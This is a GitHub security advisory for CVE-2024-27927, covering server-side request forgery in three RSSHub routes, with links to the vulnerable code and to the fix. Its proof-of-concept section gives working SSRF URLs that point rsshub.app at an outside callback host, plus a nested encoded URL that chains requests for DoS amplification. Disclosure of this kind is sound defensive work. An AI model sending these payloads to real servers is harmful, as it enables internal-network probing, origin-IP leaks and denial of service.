# [M] RSSHub vulnerable to Server-Side Request Forgery

## Summary
Severity: Medium
Advisory: GHSA-3p3p-cgj7-vgw3
CVE: CVE-2024-27927
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L (CVSS_V3)
Published: 2024-03-06
Source: https://github.com/advisories/GHSA-3p3p-cgj7-vgw3
Type: github-advisory

## Affected
- npm: `rsshub` — affected >=0 <1.0.0-master.a429472

## Details
### Summary

Serveral Server-Side Request Forgery (SSRF) vulnerabilities in RSSHub allow remote attackers to use the server as a proxy to send HTTP GET requests to arbitrary targets and retrieve information in the internal network or conduct Denial-of-Service (DoS) attacks.

### Details

#### `/mastodon/acct/:acct/statuses/:only_media?`

https://github.com/DIYgod/RSSHub/blob/5928c5db2472e101c2f5c3bafed77a2f72edd40a/lib/routes/mastodon/acct.js#L4-L7

https://github.com/DIYgod/RSSHub/blob/5928c5db2472e101c2f5c3bafed77a2f72edd40a/lib/routes/mastodon/utils.js#L85-L105

#### `/zjol/paper/:id?`

https://github.com/DIYgod/RSSHub/blob/172f6cfd2b69ea6affdbdedf61e6dde1671f3796/lib/routes/zjol/paper.js#L7-L13

#### `/m4/:id?/:category*`

https://github.com/DIYgod/RSSHub/blob/172f6cfd2b69ea6affdbdedf61e6dde1671f3796/lib/routes/m4/index.js#L10-L14

### PoC

- https://rsshub.app/mastodon/acct/test@a6wt15r2.requestrepo.com%23/statuses
- https://rsshub.app/zjol/paper/a6wt15r2.requestrepo.com%23
- https://rsshub.app/m4/a6wt15r2.requestrepo.com%23/test

### Impact

The attacker can send malicious requests to a RSSHub server, to make the server send HTTP GET requests to arbitrary destinations and see partial responses. This may lead to:

1. Leak the server IP address, which could be hidden behind a CDN.
2. Retrieve information in the internal network. e.g. which addresses/ports are accessible, the titles and meta descriptions of HTML pages.
3. DoS amplification. The attacker could request the server to download some large files, or chain several SSRF requests in a single attacker request: `https://rsshub.a.com/zjol/paper/rsshub.b.net%2Fzjol%2Fpaper%2Frsshub.a.com%252Fzjol%252Fpaper%252Frsshub.b.net%25252Fzjol%25252Fpaper%25252Frsshub.a.com%2525252Fzjol%2525252Fpaper%2525252Fexample.com%2525252523%25252523%252523%2523%23`.

## References
- https://github.com/DIYgod/RSSHub/security/advisories/GHSA-3p3p-cgj7-vgw3
- https://nvd.nist.gov/vuln/detail/CVE-2024-27927
- https://github.com/DIYgod/RSSHub/commit/a42947231104a9ec3436fc52cedb31740c9a7069
- https://github.com/DIYgod/RSSHub
- https://github.com/DIYgod/RSSHub/blob/172f6cfd2b69ea6affdbdedf61e6dde1671f3796/lib/routes/m4/index.js#L10-L14
- https://github.com/DIYgod/RSSHub/blob/172f6cfd2b69ea6affdbdedf61e6dde1671f3796/lib/routes/zjol/paper.js#L7-L13
- https://github.com/DIYgod/RSSHub/blob/5928c5db2472e101c2f5c3bafed77a2f72edd40a/lib/routes/mastodon/acct.js#L4-L7
- https://github.com/DIYgod/RSSHub/blob/5928c5db2472e101c2f5c3bafed77a2f72edd40a/lib/routes/mastodon/utils.js#L85-L105
